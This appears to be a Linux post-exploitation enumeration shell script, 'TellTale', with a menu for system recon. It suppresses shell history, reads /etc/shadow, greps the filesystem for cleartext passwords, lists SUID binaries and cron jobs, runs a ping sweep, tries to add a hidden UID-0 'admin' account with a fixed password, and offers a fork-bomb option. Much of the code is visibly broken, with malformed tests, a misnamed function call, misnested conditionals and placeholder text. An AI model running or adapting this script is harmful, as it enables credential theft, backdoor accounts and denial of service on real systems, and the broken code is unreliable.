#!/bin/sh

#TellTale by SYN-3r

#FUNCTIONS

Art() {
Color=$(printf '\033')
Magenta="${Color}[1;95m"
LGray="${Color}[1;37m"
DGray="${Color}[1;90m"
Blue="${Color}[1;34m"
Cyan="${Color}[1;96m"
Red="${Color}[1;31m"
Normal="${Color}[0m"
Green="${Color}[1;32m"
UMagenta="${Color}[1;95m${Color}[5m"
URed="${Color}[1;31m${Color}[5m"

printf """
${LGray}/-------------------------------------------------------------------------\\
|                         ${UMagenta}♥${Normal}${Magenta}  TellTale by SYN-3r  ${UMagenta}♥${Normal}${LGray}                        |
|                       ${Magenta}A Linux Enumeration Script${LGray}                        |
|-------------------------------------------------------------------------|
|${Blue}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::${LGray}|
|${Blue}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::${LGray}|
|${Blue}:::::::::::::::::::::           :::::::::           :::::::::::::::::::::${LGray}|
|${Blue}::::::::::::::::::                :::::                ::::::::::::::::::${LGray}|
|${Blue}::::::::::::::::       ${UMagenta}*********    ${Normal}${Blue}:${UMagenta}    *********${Normal}${Blue}       ::::::::::::::::${LGray}|
|${Blue}::::::::::::::      ${UMagenta}*****     *****   *****     *****${Normal}${Blue}      ::::::::::::::${LGray}|
|${Blue}:::::::::::::     ${UMagenta}****           *******           ****${Normal}${Blue}     :::::::::::::${LGray}|
|${Blue}::::::::::::     ${UMagenta}****              ***              ****${Normal}${Blue}     ::::::::::::${LGray}|
|${Blue}::::::::::::     ${UMagenta}****               *               ****${Normal}${Blue}     ::::::::::::${LGray}|
|${Blue}:::::::::::::     ${UMagenta}****                             ****${Normal}${Blue}     :::::::::::::${LGray}|
|${Blue}::::::::::::::     ${UMagenta}****                           ****${Normal}${Blue}     ::::::::::::::${LGray}|
|${Blue}::::::::::::::::     ${UMagenta}****                       ****${Normal}${Blue}     ::::::::::::::::${LGray}|
|${Blue}::::::::::::::::::     ${UMagenta}****                   ****${Normal}${Blue}     ::::::::::::::::::${LGray}|
|${Blue}::::::::::::::::::::     ${UMagenta}****               ****${Normal}${Blue}     ::::::::::::::::::::${LGray}|
|${Blue}:::::::::::::::::::::::     ${UMagenta}****         ****${Normal}${Blue}     :::::::::::::::::::::::${LGray}|
|${Blue}::::::::::::::::::::::::::     ${UMagenta}****   ****${Normal}${Blue}     ::::::::::::::::::::::::::${LGray}|
|${Blue}:::::::::::::::::::::::::::::     ${UMagenta}*****${Normal}${Blue}     :::::::::::::::::::::::::::::${LGray}|
|${Blue}::::::::::::::::::::::::::::::::    ${UMagenta}*${Normal}${Blue}    ::::::::::::::::::::::::::::::::${LGray}|
|${Blue}::::::::::::::::::::::::::::::::::     ::::::::::::::::::::::::::::::::::${LGray}|
|${Blue}:::::::::::::::::::::::::::::::::::: ::::::::::::::::::::::::::::::::::::${LGray}|
|${Blue}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::${LGray}|
\-------------------------------------------------------------------------/${Normal}

"""
}

StartUp() {
#unset history logging
unset HISTFILE
#View which user you are
user=$(whoami)
printf """
\n 
${Magenta} You are currently: ${Red} $user ${Normal} \n\n\n
"""
printf """
${Blue}Your permissions: \n${Normal}"""
  
#check if sudo can be used as the current user without a password
if [ 'echo "" | sudo -nS id"' && lse_sudo=true 2>/dev/null 1>/dev/null];
then 
          printf """
${Magenta}Password not needed to run sudo with this user ${Normal} \n """
else
          printf """
${Magenta}You must have a password to run sudo with current user ${Normal} \n """
fi
                    
#check to see what all the user can run with sudo
if [ sudo -l 2>/dev/null 1>/dev/null ];
then
          printf """
${Magenta}Commands $whoami can run with sudo: \n """
          sudo -l 2>/dev/null
else
          printf """
${Magenta}Not able to view which sudo commands can be run ${Normal}\n"

fi
}

Quit() {
printf """
  ${Red}QUITTING... ${Normal} \n """
sleep 3s
break
}

CatchAll() {
printf """
  ${Red}Please enter a valid choice \n\n\n ${Normal}"""
sleep 2s
}

SysSecure() {
printf """
  ${Blue}SYSTEM AND SECURITY INFORMATION \n\n\n${Normal}"""
  
                    #View what users are on the machine
                    loggedon=$(w)
                    #View OS info
                    OSinfo=$(uname -a 2>/dev/null)
                    #View proc version
                    OSinfo2=$(cat /proc/version 2>/dev/null)
                    #View date
                    d=$(date 2>/dev/null)
                    #View CPU info
                    cpuinfo=$(lscpu 2>/dev/null)
                    
                    printf """
  ${Magenta}Users Currently on the machine:\n\n ${Normal} $loggedon \n
  ${Magenta}Date: ${Normal} $d \n
  ${Magenta}Current Path: ${Normal} $PATH \n
  ${Magenta}OS information:${Normal} \n $OSinfo \n\n $OSinfo2 \n
  ${Magenta}CPU Information:${Normal} \n $cpuinfo \n
  ${Magenta}Security in place:${Normal} \n """
          
                    #attempt to find SELinux
                    if [ sestatus 2>/dev/null ];
                    then
                              printf """
  SELinux: ${Green}YES${Normal} """
                    else
                              printf """
  SELinux: ${Red}NO${Normal} """
                    fi
                    
                    #attempt to find Execshield
                    if [ grep "exec-shield" /etc/sysctl.conf ];
                    then
                              printf """
  Execshield: ${Green}YES${Normal} """
                    else
                              printf """
  Execshield: ${Red}NO${Normal} """
                    fi
                    
                    #attempt to find ALR
                    if [ cat /proc/sys/kernel/randomize_va_space ];
                    then
                              printf """
  ASLR: ${Green}YES${Normal} """
                    else
                              printf """
  ASLR: ${Red}NO${Normal} """
                    fi

                    #attempt to find Grsecurity
                    if [ uname -r | grep "\-grsec" >/dev/null 2>&1 ] || [ grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1 ];
                    then
                              printf """
  Grsecurity: ${Green}YES${Normal} """
                    else
                              printf """
  Grsecurity: ${Red}NO${Normal} """
                    fi
                    
                    #attempt to find PaX
                    if [ which paxctl-ng paxctl >/dev/null 2>&1 ];
                    then
                              printf """
  PaX: ${Green}YES${Normal} """
                    else
                              printf """
  PaX: ${Red}NO${Normal} """
                    fi

                    #attempt to find AppArmor
                    if [ `which aa-status 2>/dev/null` ];
                    then
                              status=$apparmor_status
                              printf """
  AppArmor: ${Green}YES${Normal} \n\t\t Status: $status """
                              
                    else
                              printf """
  AppArmor: ${Red}NO${Normal} """
                    fi
}

FindUser() {
printf """
  ${Blue}FIND USERS \n\n\n ${Normal}"""
  
                    #check to see if root already
                    if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ];
                    then
                        echo "You are already root"
                    else
                        echo "You are not root. Searching for sudo users now..."
        
                        #search for sudo users and print any sudo users found
                        echo "Sudo Users:"
                        for user in $(cut -d: -f1 /etc/passwd); 
                        do [ $(id -u $user) = 0 ] && echo $user; 
                        done | grep -v root
                    fi
                    
                    #find other non-sudo users
                    echo "Looking for other users..."
                    $users=$(ls -ld /home/* 2>/dev/null)
                    
                    #print all other users found
                    echo "Other Users:"
                    if [ $users ]; 
                    then
                              echo "$users\n"
                    else
                              echo "No other users found, might need sudo privs to view"
                    fi

                    printf """
  ${Blue}Able to create a user? ${Normal} \n """
                    if [ useradd -r -s /bin/bash user 1>/dev/null 2>/dev/null];
                    then
                            printf """
  Regular User: ${Green}YES ${Normal} \n """
                    else
                            printf """
  Regular User: ${Red}NO ${Normal} \n """
                    fi

                    if [ useradd -o -u 0 -g 0 -d /root -s /bin/bash admin echo "password" | passwd --stdin admin 1>/dev/null 2>/dev/null ];
                    then
                            printf """
  Root User: ${Green}YES ${Normal} \n """
                    else
                            printf """
  Root User: ${Red}NO ${Normal} \n """
                    fi
}

FindFiles() {
printf """
  ${Blue}FIND FILES \n\n\n ${Normal}"""
                    while true;
                    do 
                              printf """
  ${Blue} Which file type would you like to find?
  ${Magenta}1. /etc files
  2. All files with SUID bit set
  3. All text files
  4. All pdf files
  5. All image files
  Q. Quit ${Normal} \n """
  read -r files
  
                              if [ $files == "1" ];
                              then
                                        declare -a dirs=("/etc/group" "/etc/passwd" "/etc/hosts" "/etc/shadow" "/etc/shells")
                                        declare -a gooddirs=()
                                        c=1
                                        count="$c."
                                        printf """ 
  ${Blue}Are the contents of the following /etc files currently accessible? \n ${Normal} """
                                        for i in ${!dirs[@]};
                                        do
                                                  if [ $test -r ${dirs[$i]} ];
                                                  then
                                                            printf """
  ${dirs[$i]}: ${Green}YES${Normal}  """
                                                            gooddirs+=("${dirs[$i]}")
                                                  else
                                                            printf """
  ${dirs[$i]}: ${Red}NO${Normal}  """
                                                  fi
                                        done
                                        echo -en "\n"
                                        sleep 3s
                                        while true;
                                        do
                                                  c=1
                                                  count="$c."
                                                  printf """
  ${Blue}Would you like to view contents? (Y/N) ${Normal}\n """
                                                  read -r options
                                                  if [ $options == "Y" ] || [ $options == "y" ];
                                                  then
                                                  while true;
                                                  do
                                                            printf """
  ${Blue}Which would you like to display? """
                                                            for p in ${!gooddirs[@]};
                                                            do
                                                                      printf """
  ${Magenta}$count ${gooddirs[$p]} """
                                                                      c=$((c + 1))
                                                                      count="$c."
                                                            done
                                                            printf """
  ${Magenta}A. All
  Q. Quit${Normal} \n """
read -r this
                                                            if [ $this == "1" ];
                                                            then
                                                                    cat ${gooddirs[0]} 2>/dev/null
                                                                    break
                                                            elif [ $this == "2" ];
                                                            then
                                                                    cat ${gooddirs[1]} 2>/dev/null
                                                                    break
                                                            elif [ $this == "3" ];
                                                            then
                                                                    cat ${gooddirs[2]} 2>/dev/null
                                                                    break
                                                            elif [ $this == "4" ];
                                                            then
                                                                    cat ${gooddirs[3]} 2>/dev/null
                                                                    break
                                                            elif [ $this == "5" ];
                                                            then
                                                                    cat ${gooddirs[4]} 2>/dev/null
                                                                    break
                                                            elif [ $this == "6" ];
                                                            then
                                                                    cat ${gooddirs[5]} 2>/dev/null
                                                                    break
                                                            elif [ $this == "A" ] | [ $this == "a" ];
                                                            then
                                                                    echo -en "Displaying all contents now...\n\n\n"
                                                                    for a in ${!gooddirs[@]};
                                                                    do
                                                                            cat ${gooddirs[$a]}
                                                                            echo -en "\n"
                                                                    done
                                                                    break
                                                            elif [ $this == "Q" ] || [ $this == "q" ];
                                                            then
                                                                    Quit
                                                            else
                                                                    printf """
  ${Red}Please enter a valid option \n ${Normal} """
                                                            fi
                                                    done
                                          elif [ $options == "N" ] || [ $options == "n" ];
                                          then
                                                  printf """ 
  ${Blue}Will not display contents \n ${Normal} """
                                                  break
                                          else
                                                  printf """
 ${Red}Please enter a valid option ${Normal} \n """
                                                  sleep 2s
                                          fi
                                
                                  done

                              elif [ $files == "2" ];
                              then
                                        if [ find / -perm -4000 -o -perm -2000 -exec ls - 2>/dev/null 1>/dev/null];
                                        then
                                              printf """
  ${Magenta}Files with the GUID and SUID bits set ${Normal} \n """
                                              find / -perm -4000 -o -perm -2000 -exec ls - 2>/dev/null
                                        else
                                              printf """
  ${Blue}No files with the GUID or SUID bits set were found ${Normal} \n """
                                        fi
                                        break
  
                              elif [ $files == "3" ];
                              then
                              #find all text files\
                                        if [ find -i -name <file> -type *.txt 2>/dev/null 1>/dev/null ];
                                        then
                                              find -i -name <file> -type *.txt 2>/dev/null
                                              break
                                        else
                                              printf """
  ${Blue}No text files were found${Normal} \n """
                                        fi
                                              break
          
                              elif [ $files == "4" ];
                              then
                                        #find all pdf files
                                        if [ find -i -name <file> -type *.pdf 2>/dev/null 1>/dev/null ];
                                        then
                                              find -i -name <file> -type *.pdf 2>/dev/null
                                        else
                                              printf """
  ${Blue}No pdf files were found${Normal} \n """
                                        fi
                                        break

                              elif [ $files == "5" ];
                              then
                              #find all image files
                                        if [ find -i -name <file> -type *.png 2>/dev/null 1>/dev/null ] | [ find -i -name <file> -type *.jpg 2>/dev/null 1>/dev/null ]  [ find -i -name <file> -type *.gif 2>/dev/null 1>/dev/null ];
                                        then
                                                find -i -name <file> -type *.png 2>/dev/null
                                                find -i -name <file> -type *.jpg 2>/dev/null
                                                find -i -name <file> -type *.gif 2>/dev/null
                                        else
                                        printf """
  ${Blue}No image files were found${Normal} \n """
                                        fi
                                        break

                                        
                              elif [ $files == "Q" ] | [ $files == "q" ];
                              then
                                        Quit

                              else
                                        printf """
  ${Red}Please enter a valid option \n ${Normal} """
                                        sleep 2s
                              fi
                    done

}

CronJob() {
if [ crontab -l 1>/dev/null 2>/dev/null ];
                  then
                          printf """
  ${Magenta}Cron jobs for current user: ${Normal} \n"""
                          crontab -l 2>/dev/null
                  else
                          printf """
  ${Blue}No cron jobs for current user were found ${Normal} \n """
                  fi
                  
                  if [ cat /etc/crontab 1>/dev/null 2>/dev/null ] } [ ls -la /etc/cron.d 1>/dev/null 2>/dev/null ];
                  then
                          printf """
  ${Magenta}All Cron Jobs: ${Normal} \n"""
                          cat /etc/crontab 2>/dev/null
                          echo -en "\n"
                          ls -la /etc/cron.d 2>/dev/null
                  else
                          printf """
  ${Blue}No cron jobs were found ${Normal} \n """
                  fi

}

Password() {
printf """
  ${Magenta}Looking for cleartext passwords now... ${Normal} \n"""
sleep 2s
                
if [ grep --include=*.{txt,conf} -rnw '/' -e "password|p:|pass|passwd" 2>/dev/null 1>/dev/null ];
then
        printf """
  ${Magenta}Files that may contain cleartext passwords: ${Normal} \n"""
        grep --include=*.{txt,conf} -rnw '/' -e "password|p:|pass|passwd" 2>/dev/null
else
        printf """
  ${Blue}No files possibly containing cleartext passwords found ${Normal} \n"""
}

Network() { 
printf """ 
  ${Blue}VIEW NETWORK 
  Listening ports: ${Normal} 
                  """
                  if [ netstat -nap 2>/dev/null 1>/dev/null ];
                  then
                              netstat -nap 2>/dev/null
                  else
                            printf """
  ${Magenta}Could not view listening ports ${Normal} \n """
                  fi
                  
                  
                  printf """ 
  ${Blue}Looking for network interfaces file... ${Normal} \n """
                  sleep 3s
  
                  if [ cat /etc/network/interfaces 2>/dev/null 1>/dev/null ];
                  then
                              cat /etc/network/interfaces 2>/dev/null
                  else
                            printf """
  ${Magenta}Could not view network interfaces file ${Normal} \n """
                  fi

                  currentip=$(hostname -I | awk -F" " '{ print $1 }')
                  ipsweep=$(echo $currentip | cut -d"." -f1-3)  
                  printf """
  ${Magenta}Your current ip: ${Normal} $currentip \n
  ${Blue}Would you like to perform a ping sweep to find other ip addresses? (Y/N) ${Normal} \n """
  read -r ping
                  if [ $ping == "y" ] | [ $ping == "Y" ];
                  then
                          for w in {1..254..1};
                          do
                                ping -c -1 $ipsweep.$w | grep "64 b" | cut -d" " -f4 2>/dev/null
                          done
                  else
                          printf """
  ${Blue}Will not ping sweep ${Normal} \n """
                          sleep 3s
                  fi
  
}

Fork() {
printf """
  ${URed}WARNING ${Normal} 
  ${Red}Fork bombing will crash the whole system \n ${Normal}"""
                while true;
                do
                      printf """
  ${Blue}Would you like to continue? (Y/N) \n ${Normal} """
  read -r confirm
                      if [ $confirm == "Y" ] | [ $confirm == "y" ];
                      then
                              printf """
  ${Blue}Would you like perform a fork bomb? (Y/N) \n ${Normal} """
                              if [ $confirm == "Y" ] | [ $confirm == "y" ];
                              then
                                      #:(){ :|: & };: 
                              elif [ $confirm == "n" ] | [ $confirm == "N" ];
                              then
                                      printf """
  ${Blue}Will not fork bomb and crash the system \n ${Normal} """
                              else
                                      CatchAll
                              fi
                              
                      elif [ $confirm == "n" ] | [ $confirm == "N" ];
                      then
                              printf """
  ${Blue}Will not fork bomb and crash the system \n ${Normal} """
                      else
                              CatchAll
                      fi
                  done
}

End() {
printf """

${Magenta}♥ Thank you for using the TellTale Script by SYN-3r! ♥ ${Normal} """
}

MenuSelect() {
#MENU display start
while true; 
do
        printf """
          ${Blue}MAIN MENU
  What would you like to do?
  __________________________
        
  ${Magenta}1. Get System and Security Information
  2. Find Users
  3. Find Files
  4. View Cron Jobs
  5. Find Passwords
  6. View Network
  7. Fork Bomb
  Q. Quit${Normal}
        
"""
  read -r selection

          #View System and Security information
          if [ $selection == "1" ];
          then
                  SysSecure
                    
          #Find Users
          if [ $selection == "2" ];
          then
                  FindUser

          #Find Files
          elif [ $selection == "3" ];
          then
                  FindFiles

          #View Cron Jobs
          elif [ $selection == "4" ]; 
          then
                  CronJob  

          #Find Passwords
          elif [ $selection == "5" ];
          then
                  Password  
           
          #View Network
          elif [ $selection == "6" ];
          then
                  Network
                                 
          #Fork Bomb
          elif [ $selection == "7" ];
          then
                  Fork
                  
          elif [ $selection == "Q" ] || [ $selection == "q" ];
          then
                  Quit
                  
          else
                  CatchAll
        
          fi
done       
}

TellTale() {
Art
Startup
MenuSelect
End
}

#FUNCTION CALL

TellTale

